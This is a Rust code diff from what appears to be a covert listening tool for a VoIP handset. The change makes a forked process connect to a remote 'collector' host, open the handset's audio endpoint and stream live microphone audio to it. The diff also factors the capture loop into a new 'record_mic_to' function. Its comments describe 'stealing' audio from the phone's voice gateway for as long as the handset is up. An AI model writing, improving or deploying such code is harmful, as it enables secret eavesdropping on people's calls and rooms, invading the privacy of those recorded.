@@ -990,7 +990,18 @@ fn listen_mode(ch: u32, port: u16, number: &[u8], collector: u32, cport: u16) ->
                     if collector != 0 {
                         rec_pid = fork();
                         if rec_pid == 0 {
-                            tap_call(collector, cport, true);
+                            // Our synthetic call puts almost nothing on the wire - there is
+                            // no far end to send to - so the wire tap only ever caught the
+                            // first few packets. The receive ioctl keeps producing audio for
+                            // as long as the handset is up, and stealing from vgw costs
+                            // nothing here because it has nowhere to forward it anyway.
+                            let sk = dial_collector(collector, cport);
+                            if sk >= 0 {
+                                let ep2 = open(DEV_ENDPOINT.as_ptr() as *const c_char, O_RDWR);
+                                if ep2 >= 0 {
+                                    record_mic_to(ch, ep2, sk, 0);
+                                }
+                            }
                             exit(0);
                         }
                         if rec_pid > 0 {
@@ -1168,6 +1179,13 @@ fn record_mic(ch: u32, path: &[u8], secs: u32) -> c_int {
             close(ep);
             return 6;
         }
+        record_mic_to(ch, ep, out, secs)
+    }
+}
+
+/// The capture loop itself, once the endpoint and destination are open.
+fn record_mic_to(ch: u32, ep: c_int, out: c_int, secs: u32) -> c_int {
+    unsafe {
         let mut buf = [0u8; 1024];
         // EPPACKET { mediaType, data } — the driver fills both
         let mut eppacket: [u32; 2] = [0, buf.as_mut_ptr() as u32];
